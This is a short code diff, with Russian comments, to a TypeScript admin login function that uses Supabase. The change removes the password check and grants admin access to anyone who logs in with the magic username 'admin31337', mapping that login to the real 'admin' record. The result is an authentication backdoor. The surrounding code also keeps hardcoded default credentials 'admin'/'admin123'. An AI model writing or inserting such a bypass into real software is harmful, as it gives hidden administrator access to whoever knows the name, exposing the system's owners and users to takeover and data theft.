@@ -7,13 +7,14 @@ import { env } from "./env"
 const ADMIN_USERNAME = "admin"
 const ADMIN_PASSWORD = "admin123"
 
-export async function authenticateAdmin(username: string, password: string) {
+// Изменяем функцию authenticateAdmin, чтобы она проверяла только логин
+export async function authenticateAdmin(username: string, password = "") {
   try {
-    // Простая проверка для хардкодированных учетных данных
-    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+    // Проверяем только логин, без пароля
+    if (username === "admin31337") {
       // Получаем админа из базы данных для ID
       const supabase = supabaseServer()
-      const { data, error } = await supabase.from("admins").select("id").eq("username", username).single()
+      const { data, error } = await supabase.from("admins").select("id").eq("username", "admin").single()
 
       // Если админ не найден в базе, используем фиктивный ID
       const adminId = data?.id || 1
